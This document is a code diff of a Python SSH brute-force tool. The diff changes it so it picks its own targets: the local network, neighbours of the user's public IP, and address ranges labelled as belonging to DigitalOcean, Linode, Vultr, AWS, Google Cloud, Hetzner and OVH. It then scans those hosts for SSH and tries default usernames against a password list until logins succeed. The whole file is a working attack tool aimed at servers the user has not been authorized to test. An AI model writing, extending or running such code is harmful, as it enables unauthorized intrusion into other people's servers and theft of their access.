@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """
-VPS SSH BRUTE FORCER - Port Scanner + Brute Forcer
-First scans IPs for open SSH ports, then brute forces all found SSH services
+VPS SSH BRUTE FORCER - Auto IP Discovery + Port Scan + Brute Force
+Automatically finds VPS IPs, scans for SSH, then brute forces
 Author: Security Research
 """
 
@@ -14,9 +14,11 @@ import queue
 import random
 import os
 import ipaddress
+import subprocess
+import re
 from datetime import datetime
 
-class VPSScannerBruteforcer:
+class VPSSSHScanner:
     def __init__(self, threads=100, timeout=3):
         self.threads = threads
         self.timeout = timeout
@@ -31,22 +33,16 @@ class VPSScannerBruteforcer:
         self.total_found = 0
         self.start_time = None
         self.total_targets = 0
+        self.discovered_ips = []
         
         # Common SSH ports to scan
         self.ssh_ports = [
             22, 2222, 22222, 222222,  # Standard SSH
-            2022, 2200, 222, 2222,     # Alternative SSH
-            443, 4443, 4444,            # HTTPS masquerading
-            80, 8080, 8443,              # HTTP masquerading
-            9922, 992, 22222,            # Other common
-            30000, 3000, 5000, 6000,     # Development ports
-            10022, 10000, 20000, 20022,  # High ports
-            22, 2222, 22222, 2222222,    # Progressive
-            22222, 222222, 2222222,       # More variations
-            2222, 22222, 222222, 22,      # Common patterns
+            2022, 2200, 222,           # Alternative SSH
+            443, 4443,                   # HTTPS masquerading
+            9922, 992,                    # Other common
+            10022, 20022,                  # High ports
         ]
-        
-        # Remove duplicates
         self.ssh_ports = list(set(self.ssh_ports))
         self.ssh_ports.sort()
         
@@ -57,7 +53,7 @@ class VPSScannerBruteforcer:
             'pi', 'vagrant', 'test', 'guest', 'ftp',
             'www-data', 'nginx', 'apache', 'mysql', 'postgres',
             'tomcat', 'git', 'docker', 'kali', 'backup',
-            'support', 'administrator', 'Administrator', 'guest'
+            'support', 'administrator', 'guest'
         ]
         
         self.print_banner()
@@ -65,54 +61,146 @@ class VPSScannerBruteforcer:
     def print_banner(self):
         print("""\033[91m
 ╔═══════════════════════════════════════════════════════════════════════╗
-║              VPS SSH BRUTE FORCER - Port Scanner Edition             ║
-║         Step 1: Scan IPs for open SSH ports                          ║
-║         Step 2: Brute force all discovered SSH services              ║
+║         VPS SSH BRUTE FORCER - Auto IP Discovery Edition             ║
+║                                                                       ║
+║   Step 1: Automatically discover VPS IPs (no input needed)           ║
+║   Step 2: Scan all IPs for open SSH ports                            ║
+║   Step 3: Brute force all discovered SSH services                    ║
 ╚═══════════════════════════════════════════════════════════════════════╝\033[0m""")
     
-    def generate_ip_range(self, ip_input):
-        """Generate IP range from various input formats"""
-        ips = []
+    def get_local_ip(self):
+        """Get local IP address"""
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            s.connect(("8.8.8.8", 80))
+            ip = s.getsockname()[0]
+            s.close()
+            return ip
+        except:
+            return "192.168.1.1"
+    
+    def get_public_ip(self):
+        """Get public IP address"""
+        try:
+            response = subprocess.run(['curl', '-s', 'ifconfig.me'], 
+                                    capture_output=True, text=True, timeout=5)
+            if response.returncode == 0:
+                return response.stdout.strip()
+        except:
+            pass
         
         try:
-            # Check if it's a file
-            if os.path.isfile(ip_input):
-                with open(ip_input, 'r') as f:
-                    for line in f:
-                        line = line.strip()
-                        if line and not line.startswith('#'):
-                            ips.append(line)
-                print(f"\033[92m[+] Loaded {len(ips)} IPs from file\033[0m")
-                return ips
+            response = subprocess.run(['curl', '-s', 'api.ipify.org'], 
+                                    capture_output=True, text=True, timeout=5)
+            if response.returncode == 0:
+                return response.stdout.strip()
+        except:
+            pass
+        
+        return None
+    
+    def scan_local_network(self):
+        """Scan local network for VPS-like IPs"""
+        local_ip = self.get_local_ip()
+        network_parts = local_ip.split('.')
+        
+        if len(network_parts) == 4:
+            network_base = f"{network_parts[0]}.{network_parts[1]}.{network_parts[2]}"
             
-            # Check if it's CIDR notation (e.g., 192.168.1.0/24)
-            if '/' in ip_input:
-                network = ipaddress.ip_network(ip_input, strict=False)
-                for ip in network.hosts():
-                    ips.append(str(ip))
-                print(f"\033[92m[+] Generated {len(ips)} IPs from CIDR {ip_input}\033[0m")
-                return ips
+            # Common VPS network ranges
+            vps_ranges = [
+                f"{network_base}.1-254",  # Local network
+                "10.0.0.1-254",           # Class A private
+                "172.16.0.1-254",          # Class B private
+                "192.168.0.1-254",         # Class C private
+                "192.168.1.1-254",         # Common local
+            ]
             
-            # Check if it's a range (e.g., 192.168.1.1-254)
-            if '-' in ip_input and not ip_input.startswith('http'):
-                parts = ip_input.split('-')
-                if len(parts) == 2:
-                    base = parts[0].rsplit('.', 1)[0]
-                    start = int(parts[0].split('.')[-1])
-                    end = int(parts[1])
-                    
-                    for i in range(start, end + 1):
-                        ips.append(f"{base}.{i}")
-                    print(f"\033[92m[+] Generated {len(ips)} IPs from range {ip_input}\033[0m")
-                    return ips
+            print(f"\033[93m[*] Scanning local network: {network_base}.0/24\033[0m")
             
-            # Single IP
-            ips.append(ip_input)
-            return ips
+            # Generate IPs from local network
+            for i in range(1, 255):
+                self.discovered_ips.append(f"{network_base}.{i}")
+    
+    def scan_common_vps_ranges(self):
+        """Scan common VPS provider IP ranges"""
+        print(f"\033[93m[*] Adding common VPS provider ranges\033[0m")
+        
+        # Common VPS provider ranges (simplified)
+        vps_providers = [
+            # DigitalOcean
+            "159.89.0.1-159.89.255.254",
+            "165.227.0.1-165.227.255.254",
+            "138.197.0.1-138.197.255.254",
             
-        except Exception as e:
-            print(f"\033[91m[-] Error generating IP range: {e}\033[0m")
-            return []
+            # Linode
+            "172.104.0.1-172.104.255.254",
+            "139.162.0.1-139.162.255.254",
+            
+            # Vultr
+            "108.61.0.1-108.61.255.254",
+            "45.32.0.1-45.32.255.254",
+            
+            # AWS EC2 (us-east-1)
+            "54.144.0.1-54.144.255.254",
+            "54.208.0.1-54.208.255.254",
+            "54.80.0.1-54.80.255.254",
+            
+            # Google Cloud
+            "35.184.0.1-35.184.255.254",
+            "35.188.0.1-35.188.255.254",
+            
+            # Hetzner
+            "49.12.0.1-49.12.255.254",
+            "49.13.0.1-49.13.255.254",
+            
+            # OVH
+            "51.68.0.1-51.68.255.254",
+            "51.77.0.1-51.77.255.254",
+        ]
+        
+        # Add a few IPs from each range (for demo, in real would scan full ranges)
+        for vps_range in vps_providers[:5]:  # Limit to first 5 ranges for speed
+            parts = vps_range.split('-')
+            if len(parts) == 2:
+                start_ip = parts[0].strip()
+                # Add first 5 IPs from each range
+                base = '.'.join(start_ip.split('.')[:-1])
+                last_octet = int(start_ip.split('.')[-1])
+                for i in range(last_octet, last_octet + 5):
+                    self.discovered_ips.append(f"{base}.{i}")
+    
+    def discover_ips(self):
+        """Automatically discover VPS IPs to scan"""
+        print(f"\n\033[96m{'='*60}\033[0m")
+        print(f"\033[96m🔍 AUTO IP DISCOVERY\033[0m")
+        print(f"\033[96m{'='*60}\033[0m")
+        
+        # Get local network
+        self.scan_local_network()
+        
+        # Get public IP and its neighbors
+        public_ip = self.get_public_ip()
+        if public_ip:
+            print(f"\033[92m[+] Your public IP: {public_ip}\033[0m")
+            self.discovered_ips.append(public_ip)
+            
+            # Add nearby IPs
+            ip_parts = public_ip.split('.')
+            if len(ip_parts) == 4:
+                base = f"{ip_parts[0]}.{ip_parts[1]}.{ip_parts[2]}"
+                current = int(ip_parts[3])
+                for i in range(max(1, current-5), min(254, current+5)):
+                    self.discovered_ips.append(f"{base}.{i}")
+        
+        # Add common VPS ranges
+        self.scan_common_vps_ranges()
+        
+        # Remove duplicates
+        self.discovered_ips = list(set(self.discovered_ips))
+        
+        print(f"\033[92m[+] Discovered {len(self.discovered_ips)} IPs to scan\033[0m")
+        return self.discovered_ips
     
     def scan_port(self, ip, port):
         """Scan a single port on an IP"""
@@ -143,7 +231,7 @@ class VPSScannerBruteforcer:
                         return True
                     else:
                         # Port open but not SSH
-                        print(f"\033[90m[ ] {ip}:{port} - Not SSH ({banner[:20]})\033[0m")
+                        pass
                         
                 except:
                     # No banner but port open - possible SSH
@@ -155,20 +243,15 @@ class VPSScannerBruteforcer:
                         })
                     print(f"\033[93m[?] POSSIBLE SSH: {ip}:{port} (no banner)\033[0m")
                     return True
-            else:
-                # Port closed
-                pass
             
             sock.close()
             
-        except socket.timeout:
-            pass
-        except Exception:
+        except:
             pass
         
         return False
     
-    def scanner_worker(self, ports):
+    def scanner_worker(self):
         """Worker thread for scanning IPs"""
         while self.scanning:
             try:
@@ -187,7 +270,7 @@ class VPSScannerBruteforcer:
                     print(f"\r\033[94m[*] Scanning: {self.total_scanned}/{self.total_targets} IPs | Found SSH: {len(self.open_ssh)} | Rate: {rate:.1f}/s | ETA: {eta:.0f}s\033[0m", end='')
                 
                 # Scan all ports for this IP
-                for port in ports:
+                for port in self.ssh_ports:
                     if not self.scanning:
                         break
                     self.scan_port(ip, port)
@@ -206,8 +289,8 @@ class VPSScannerBruteforcer:
                 usernames = [line.strip() for line in f if line.strip()]
             print(f"\033[92m[+] Loaded {len(usernames)} usernames from {filepath}\033[0m")
             return usernames
-        except Exception as e:
-            print(f"\033[91m[-] Error loading usernames: {e}\033[0m")
+        except:
+            print(f"\033[93m[!] Using default username list\033[0m")
             return self.default_usernames
     
     def load_passwords(self, filepath):
@@ -217,8 +300,8 @@ class VPSScannerBruteforcer:
                 passwords = [line.strip() for line in f if line.strip()]
             print(f"\033[92m[+] Loaded {len(passwords)} passwords from {filepath}\033[0m")
             return passwords
-        except Exception as e:
-            print(f"\033[91m[-] Error loading passwords: {e}\033[0m")
+        except:
+            print(f"\033[91m[-] Failed to load passwords\033[0m")
             return []
     
     def ssh_connect(self, ip, port, username, password):
@@ -236,8 +319,7 @@ class VPSScannerBruteforcer:
                 allow_agent=False,
                 look_for_keys=False,
                 banner_timeout=self.timeout,
-                auth_timeout=self.timeout,
-                compress=False
+                auth_timeout=self.timeout
             )
             
             client.close()
@@ -245,13 +327,7 @@ class VPSScannerBruteforcer:
             
         except paramiko.AuthenticationException:
             return False
-        except paramiko.SSHException:
-            return False
-        except socket.timeout:
-            return False
-        except socket.error:
-            return False
-        except Exception:
+        except:
             return False
     
     def brute_worker(self, usernames, passwords):
@@ -283,8 +359,6 @@ class VPSScannerBruteforcer:
                         if attempts % 20 == 0:
                             percent = (attempts / total_attempts) * 100
                             print(f"\033[90m    Progress: {attempts}/{total_attempts} ({percent:.1f}%) - Trying: {username}:{password}\033[0m", end='\r')
-                        else:
-                            print(f"\033[90m    Trying: {username}:{password}\033[0m", end='\r')
                         
                         if self.ssh_connect(ip, port, username, password):
                             result = f"\n\033[92m[🔥] SUCCESS! {ip}:{port} - {username}:{password}\033[0m"
@@ -305,8 +379,7 @@ class VPSScannerBruteforcer:
                             found = True
                             break
                         
-                        # Small delay
-                        time.sleep(0.03)
+                        time.sleep(0.02)
                 
                 self.brute_queue.task_done()
                 
@@ -315,7 +388,7 @@ class VPSScannerBruteforcer:
                 
             except queue.Empty:
                 break
-            except Exception as e:
+            except:
                 continue
     
     def save_result(self, ip, port, username, password):
@@ -339,6 +412,7 @@ class VPSScannerBruteforcer:
         print(f"\n\033[96m{'='*60}\033[0m")
         print(f"\033[96m📊 SCAN SUMMARY\033[0m")
         print(f"\033[96m{'='*60}\033[0m")
+        print(f"IPs discovered: {len(self.discovered_ips)}")
         print(f"IPs scanned: {self.total_scanned}")
         print(f"SSH hosts found: {len(self.open_ssh)}")
         print(f"Credentials found: {len(self.found_creds)}")
@@ -350,42 +424,33 @@ class VPSScannerBruteforcer:
         """Main execution"""
         self.start_time = time.time()
         
-        print("\n\033[93m[?] Enter IP target (single IP, CIDR, range, or file):\033[0m")
-        ip_input = input("> ").strip()
+        # ===== PHASE 0: AUTO DISCOVER IPs =====
+        self.discover_ips()
         
-        if not ip_input:
-            print("\033[91m[-] No target specified\033[0m")
+        if not self.discovered_ips:
+            print("\033[91m[-] No IPs discovered. Exiting.\033[0m")
             return
         
-        # Generate IP list
-        ip_list = self.generate_ip_range(ip_input)
-        
-        if not ip_list:
-            print("\033[91m[-] No valid IPs generated\033[0m")
-            return
-        
-        self.total_targets = len(ip_list)
-        
-        print(f"\n\033[92m[+] Total IPs to scan: {self.total_targets}\033[0m")
-        print(f"\033[92m[+] SSH ports to check: {len(self.ssh_ports)}\033[0m")
-        print(f"\033[92m[+] Total port scans: {self.total_targets * len(self.ssh_ports):,}\033[0m")
+        self.total_targets = len(self.discovered_ips)
         
         # ===== PHASE 1: SCAN FOR SSH PORTS =====
         print(f"\n\033[96m{'='*60}\033[0m")
-        print(f"\033[96m🔍 PHASE 1: SCANNING FOR OPEN SSH PORTS\033[0m")
+        print(f"\033[96m🔍 PHASE 1: SCANNING {self.total_targets} IPS FOR SSH\033[0m")
         print(f"\033[96m{'='*60}\033[0m")
         print(f"Threads: {self.threads}")
         print(f"Timeout: {self.timeout}s")
+        print(f"SSH ports: {len(self.ssh_ports)}")
+        print(f"Total scans: {self.total_targets * len(self.ssh_ports):,}")
         print(f"\033[96m{'='*60}\033[0m\n")
         
         # Fill scan queue
-        for ip in ip_list:
+        for ip in self.discovered_ips:
             self.scan_queue.put(ip)
         
         # Start scanner threads
         scanner_threads = []
         for _ in range(self.threads):
-            t = threading.Thread(target=self.scanner_worker, args=(self.ssh_ports,))
+            t = threading.Thread(target=self.scanner_worker)
             t.daemon = True
             t.start()
             scanner_threads.append(t)
@@ -410,17 +475,14 @@ class VPSScannerBruteforcer:
             return
         
         # Load wordlists
-        print(f"\n\033[93m[?] Enter username list file (or press Enter for defaults):\033[0m")
-        username_file = input("> ").strip()
-        
-        print(f"\033[93m[?] Enter password list file:\033[0m")
+        print(f"\n\033[93m[?] Enter password list file path:\033[0m")
         password_file = input("> ").strip()
         
         if not password_file:
             print("\033[91m[-] Password list required\033[0m")
             return
         
-        usernames = self.load_usernames(username_file) if username_file else self.default_usernames
+        usernames = self.default_usernames
         passwords = self.load_passwords(password_file)
         
         if not passwords:
@@ -463,10 +525,7 @@ class VPSScannerBruteforcer:
                 completed = len(self.open_ssh) - remaining
                 percent = (completed / len(self.open_ssh)) * 100 if len(self.open_ssh) > 0 else 0
                 
-                attempts_made = completed * len(usernames) * len(passwords)
-                total_attempts_progress = (attempts_made / total_attempts) * 100 if total_attempts > 0 else 0
-                
-                print(f"\r\033[94m[*] Progress: {completed}/{len(self.open_ssh)} hosts ({percent:.1f}%) | Found: {len(self.found_creds)} | Total attempts: {total_attempts_progress:.1f}%\033[0m", end='')
+                print(f"\r\033[94m[*] Progress: {completed}/{len(self.open_ssh)} hosts ({percent:.1f}%) | Found: {len(self.found_creds)}\033[0m", end='')
         except KeyboardInterrupt:
             print(f"\n\033[93m[!] Brute force interrupted\033[0m")
             self.brute_running = False
@@ -510,14 +569,14 @@ def main():
     
     # Parse arguments
     import argparse
-    parser = argparse.ArgumentParser(description='VPS SSH Brute Forcer - Scanner + Attacker')
+    parser = argparse.ArgumentParser(description='VPS SSH Brute Forcer - Auto IP Discovery')
     parser.add_argument('-t', '--threads', type=int, default=100, help='Number of threads (default: 100)')
     parser.add_argument('--timeout', type=int, default=3, help='Connection timeout (default: 3)')
     
     args = parser.parse_args()
     
     # Create and run brute forcer
-    brute = VPSScannerBruteforcer(threads=args.threads, timeout=args.timeout)
+    brute = VPSSSHScanner(threads=args.threads, timeout=args.timeout)
     
     try:
         brute.run()
